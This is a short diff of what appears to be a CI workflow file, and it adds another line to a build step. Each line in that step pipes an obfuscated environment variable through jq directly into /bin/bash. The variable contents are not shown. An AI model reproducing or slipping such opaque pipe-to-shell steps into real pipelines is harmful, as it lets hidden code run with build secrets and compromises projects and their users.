@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$npb89" | jq -r .mnicx1233 | /bin/bash
           echo $uj069 | jq -r .r7111 | /bin/bash
           echo $lxcud8807 | jq -r .bs09516 | /bin/bash
+          printf '%s' "$zpgt46" | jq -r .dacnh24358 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
